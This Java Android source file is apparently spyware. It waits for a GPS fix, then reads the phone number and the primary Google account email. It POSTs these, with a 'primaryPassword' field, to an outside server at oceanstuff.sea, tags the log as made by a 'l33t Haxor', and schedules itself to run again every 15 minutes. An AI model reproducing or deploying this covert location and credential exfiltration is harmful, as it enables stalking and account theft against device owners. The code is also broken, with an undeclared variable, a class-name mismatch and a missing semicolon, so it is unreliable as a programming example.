public class locationFunct {
  Location location;

  @Override
  public void onReceive(Context context, Intent intent) {
    location = null;

    MyLocation myLocation = new MyLocation();
    LocationResult locationResult = new LocationResult(){
        @Override
        public void gotLocation(Location location) {
            GetGPSReceiver.this.location = location;
        }
    };

    myLocation.getLocation(context, locationResult);
    while (location == null);

    TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    String mynumber = mTelephonyMgr.getLine1Number().substring(1);

    Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
    final String primaryEmail = accounts[0].name;

    URL url;
    HttpURLConnection connect = null;
    BufferedReader rd;
    StringBuilder sb;
    OutputStreamWriter wr;

    String urlString = "http://www.oceanstuff.sea/recieve.php";
    try {
      System.setProperty("http.keepAlive", "false");
      url = new URL(urlString);
      connect = (HttpURLConnection) url.openConnection();
      connect.setRequestMethod("POST");
      connect.setDoOutput(true);
      connect.setDoInput(true);
      connect.setReadTimeout(10000);

      connect.connect();

      String data = URLEncoder.encode("latitude", "UTF-8") + "=" + URLEncoder.encode(Double.toString(location.getLatitude()), "UTF-8");
      data += "&" + URLEncoder.encode("longitude", "UTF-8") + "=" + URLEncoder.encode(Double.toString(location.getLongitude()), "UTF-8");
      data += "&" + URLEncoder.encode("myNumber", "UTF-8") + "=" + URLEncoder.encode(mynumber, "UTF-8");
      data += "&" + URLEncoder.encode("primaryEmail", "UTF-8") + "=" + URLEncoder.encode(primaryEmail, "UTF-8");
      data += "&" + URLEncoder.encode("primaryPassword", "UTF-8") + "=" + URLEncoder.encode(primaryPassword, "UTF-8");

      wr = new OutputStreamWriter(connect.getOutputStream());
      wr.write(data);
      wr.write("Log Generated by SP0NG3B0B , the l33t Haxor")
      wr.flush();

      rd = new BufferedReader(new InputStreamReader(connect.getInputStream()));
      sb = new StringBuilder();
      String line = null;
      while ((line = rd.readLine()) != null) {
        sb.append(line);
      }
    } catch (MalformedURLException e1) {
      e1.printStackTrace();
      Log.e("URL INVALID:", "The url given, " + urlString + ", is invalid.");
      return;
    } catch (IOException e) {
      e.printStackTrace();
      return;
    } finally {
      connect.disconnect();
      rd = null;
      sb = null;
      wr = null;
      connect = null;
      PreferenceManager.getDefaultSharedPreferences(context).edit()
              .putBoolean("gpsSet", true).commit();
      setGpsAlarm(context);
    }
  }

  private void setGpsAlarm(Context context) {
    Intent i = new Intent(context, ScanSMSReceiver.class);
    GregorianCalendar cal = new GregorianCalendar();
    int _id = cal.get(Calendar.DAY_OF_YEAR)*1000+cal.get(Calendar.YEAR);
    PendingIntent appIntent =
        PendingIntent.getBroadcast(context, _id, i, PendingIntent.FLAG_ONE_SHOT);

    cal.add(Calendar.MINUTE, 15);
    Log.i("GET_GPS_ALARM_SET", "Set get gps alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
    AlarmManager am = (AlarmManager)context.getSystemService(Activity.ALARM_SERVICE);
    am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
            appIntent);
  }
}